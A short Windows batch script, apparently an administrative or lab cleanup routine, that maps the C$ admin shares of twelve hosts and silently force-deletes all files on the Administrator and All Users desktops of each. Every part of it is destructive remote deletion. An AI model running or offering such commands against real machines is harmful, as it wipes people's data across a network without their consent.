cd\
net use i: \\131.107.2.1\c$
i:
cd\
pause
cd WINNT\Profiles\Administrator\desktop
pause
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use j: \\131.107.2.2\c$
j:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use l: \\131.107.2.3\c$
l:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use k: \\131.107.2.4\c$
k:
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use m: \\131.107.2.5\c$
m:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use n: \\131.107.2.6\c$
n:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use o: \\131.107.2.7\c$
o:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use p: \\131.107.2.8\c$
p:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use q: \\131.107.2.9\c$
q:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use r: \\131.107.2.10\c$
r:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use s: \\131.107.2.11\c$
s:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use t: \\131.107.2.12\c$
t:
cd\
cd WINNT\Profiles\Administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

pause

net use * /delete /y